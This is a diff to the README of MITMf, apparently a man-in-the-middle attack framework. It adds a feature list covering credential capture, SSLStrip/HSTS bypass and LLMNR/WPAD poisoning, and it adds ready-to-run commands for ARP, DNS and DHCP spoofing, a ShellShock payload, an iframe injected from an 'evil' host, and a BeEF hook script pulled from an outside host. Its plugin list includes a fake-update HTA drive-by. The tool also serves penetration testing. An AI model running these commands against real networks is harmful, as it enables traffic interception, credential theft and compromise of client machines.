@@ -26,10 +26,54 @@ existing attacks and techniques.
 Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost completely 
 re-written from scratch to provide a modular and easily extendible framework that anyone can use to implement their own MITM attack.
 
-Additionally, the framework contains a built-in SMB, HTTP and DNS server that can be controlled and used by the various plugins.
+Main Features
+=============
 
-Available plugins
-=================
+- The framework contains a built-in SMB, HTTP and DNS server that can be controlled and used by the various plugins it also contains a modified version of the SSLStrip proxy that allows for HTTP modification and a partial HSTS bypass.
+
+- As of version 0.9.8, MITMf supports active packet filtering and manipulation (basically what etterfilters did, only better),
+allowing users to modify any type of traffic or protocol.
+
+- The configuration file can be edited on-the-fly while MITMf is running and the changes will be passed down through the framework, this allows you to tweak settings of plugins and servers while performing an attack.
+
+- MITMf will capture FTP, IRC, POP, IMAP, Telnet, SMTP, SNMP (community strings), NTLMv1/v2 (all supported protocols like HTTP, SMB, LDAP etc.) and Kerberos credentials by using [Net-Creds](https://github.com/DanMcInerney/net-creds), which is run on startup.
+
+- [Responder](https://github.com/SpiderLabs/Responder) integration allows for LLMNR, NBT-NS and MDNS poisoning a rogue WPAD rouge server support.
+
+Examples
+========
+
+- The most basic usage, just starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface ```enp3s0```:
+```python mitmf.py -i enp3s0```
+
+- ARP poison 192.168.1.0/24 with the gateway at 192.168.1.1 using the **Spoof** plugin:
+```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
+
+- Same as above + a WPAD rougue proxy server using the **Responder** plugin:
+```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.0.0/24 --gateway 192.168.1.1 --responder --wpad```
+
+- Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
+```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
+
+- Enable LLMNR/NBTNS/MDNS spoofing:
+```python mitmf.py -i enp3s0 --responder --wredir --nbtns```
+
+- Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
+```python mitmf.py -i enp3s0 --spoof --dhcp```
+
+- Same as above with a ShellShock payload that will be executed if any client is vulnerable:
+```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```
+
+- Inject an HTML IFrame using the **Inject** plugin:
+```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```
+
+- Inject a JS script:
+```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```
+
+And much much more! Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..) 
+
+#Currently available plugins
+
 - **HTA Drive-By**     : Injects a fake update notification and prompts clients to download an HTA application
 - **SMBTrap**          : Exploits the 'SMB Trap' vulnerability on connected clients
 - **ScreenShotter**    : Uses HTML5 Canvas to render an accurate screenshot of a clients browser
@@ -59,8 +103,13 @@ Installation
 ============
 
 - Clone this repository
+- ```apt-get install build-essential python-dev libnetfilter-queue-dev``` for active packet filtering/modification
 - Run the ```setup.sh``` script
 - Run the command ```pip install --upgrade -r requirements.txt``` to install all Python dependencies
+
+**Note:** on Kali, Debian (and possibly Ubuntu): If pip complains about ```pcap.h``` missing, install the ```libpcap0.8-dev``` and ```python-pypcap``` packages and try again
+
+**Note 2:** If ```netfilterqueue``` fails to compile, install the ```libnetfilter-queue-dev``` package
 
 FAQ
 ===
